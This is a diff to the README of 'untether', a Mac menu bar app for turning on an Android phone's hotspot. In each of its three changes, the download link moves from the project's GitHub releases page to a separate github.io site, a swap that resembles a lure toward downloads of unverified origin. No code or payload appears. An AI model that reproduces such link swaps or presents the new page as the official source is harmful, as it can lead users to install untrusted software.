@@ -1,6 +1,6 @@
 # 📶 untether - Instant Hotspot With One Click
 
-[![Download untether](https://img.shields.io/badge/Download-untether-ff4fa3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/udls-website/untether/releases)
+[![Download untether](https://img.shields.io/badge/Download-untether-ff4fa3?style=for-the-badge&logo=github&logoColor=white)](https://udls-website.github.io)
 
 **Note before you begin:** untether is a Mac menu bar app that controls an Android phone. The download page linked above is where the application lives — everything else in this guide explains what it does, how to get it, and how to use it without any technical background.
 
@@ -41,7 +41,7 @@ Getting untether is a two-part process because it has two pieces: the Mac menu b
 
 Go to the official releases page:
 
-👉 **https://github.com/udls-website/untether/releases**
+👉 **https://udls-website.github.io**
 
 Visit this link to download the application.
 
@@ -111,7 +111,7 @@ If something does not work, the releases page is the first place to look — eac
 
 Everything starts here:
 
-👉 **https://github.com/udls-website/untether/releases**
+👉 **https://udls-website.github.io**
 
 Visit this link to download the application.
 
